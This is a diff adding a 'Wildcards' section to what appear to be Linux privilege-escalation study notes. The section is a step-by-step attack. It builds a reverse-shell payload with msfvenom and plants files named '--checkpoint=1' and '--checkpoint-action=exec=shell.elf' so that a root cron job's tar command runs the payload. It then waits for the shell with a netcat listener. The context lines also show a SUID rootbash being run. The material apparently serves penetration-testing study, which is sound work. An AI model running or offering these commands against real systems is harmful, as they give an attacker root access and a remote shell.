@@ -242,7 +242,28 @@ Execute it
 /tmp/rootbash –p
 ``` 
   
+Wildcards
+It is possible to pass command line options (e.g. -h, --help) to commands by creating files with these names.
+GTFOBins (https://gtfobins.github.io) can help determine whether a command has command line options which will be useful for our purposes.
+![Screenshot 2021-08-30 at 12 37 30](https://user-images.githubusercontent.com/87951795/131327094-c3266177-7a29-4e08-a6f2-dd3505ecc07d.png)
+``` 
+cat /etc/crontab
+cat /usr/local/bin/compress.sh
+
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
   
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=53 -f elf -o shell.elf
   
+- Copy the file to the /home/user directory on the remote host and make it executable:
+chmod +x /home/user/shell.elf
   
+- Create two files in the /home/user directory:
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+  
+- Run a netcat listener on your local machine and wait for the cron job to run
+nc -nvlp 53
+``` 
   
